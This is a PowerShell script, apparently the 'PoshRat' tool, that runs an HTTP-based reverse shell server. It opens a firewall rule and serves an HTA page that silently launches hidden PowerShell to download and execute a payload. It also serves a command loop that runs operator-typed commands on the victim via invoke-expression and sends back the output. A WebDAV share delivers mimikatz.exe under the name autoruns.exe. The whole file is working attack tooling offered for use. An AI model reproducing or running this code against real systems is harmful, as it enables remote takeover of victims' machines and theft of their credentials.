<#
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Deliver the link to the target and wait for connectback.
  
  .PARAMETER Server
  
  Listening Server IP Address
  
#>

$Server = '127.0.0.1' #Listening IP. Change This.
<#
$net = new-object -ComObject WScript.Network
$net.MapNetworkDrive("r:", "\\127.0.0.1\drive", $true, "domain\user", "password")
#>

#JE-WEBDAV Just Enough WebDAV to allow you to map drive to get a binary back to host:)
[byte[]] $File = [System.IO.File]::ReadAllBytes('C:\Tools\mimikatz.exe')

$webDAVPROPFINDResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+ $Server +'/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>Thu, 07 Aug 2014 16:33:21 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>/</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>2014-05-27T19:01:44.48Z</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>'

$webDAVXFERResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+$Server+'/drive/file</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype>application/octet-stream</D:getcontenttype><D:getlastmodified>Thu, 11 Jun 2015 05:20:18 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag>"3d6f834e6a4d01:0"</D:getetag><D:displayname>autoruns.exe</D:displayname><D:getcontentlanguage/><D:getcontentlength>'+ $File.Length +'</D:getcontentlength><D:iscollection>0</D:iscollection><D:creationdate>2014-05-27T19:36:39.240Z</D:creationdate><D:resourcetype/></D:prop></D:propstat></D:response></D:multistatus>'

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
					$s = "http://' + $Server + '/rat"
					$w = New-Object Net.WebClient 
					while($true)
					{
						$r = $w.DownloadString("$s")
						while($r) {
							$o = invoke-expression $r | out-string 
							$w.UploadString("$s", $o)	
							break
						}
					}
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "PS $hostip>"		
    }
    if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'application/hta'
		$htacode = '<html>
					  <head>
						<script>
						var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://' + $Server + '/connect''))\"\"";' + 
						'new ActiveXObject(''WScript.Shell'').Run(c);
						</script>
					  </head>
					  <body>
					  <script>self.close();</script>
					  </body>
					</html>'
		
		$buffer = $enc.GetBytes($htacode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
	if ($request.Url -match '/drive$' -and ($request.HttpMethod -eq "OPTIONS") ){  
		$response.AddHeader("Allow", "Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK")
		$response.Close()
		continue
		
    }
    if ($request.Url -match '/drive$' -and ($request.HttpMethod -eq "PROPFIND") ){  
        $message = $webDAVPROPFINDResponse
    }
	if ($request.Url -match '/drive/file$' -and ($request.HttpMethod -eq "PROPFIND") ){  
		$message = $webDAVXFERResponse
	}
	if ($request.Url -match '/drive/file$' -and ($request.HttpMethod -eq "GET") ){  
		[byte[]] $buffer = $File
		$response.ContentType = 'application/octetstream'
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
	
	
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
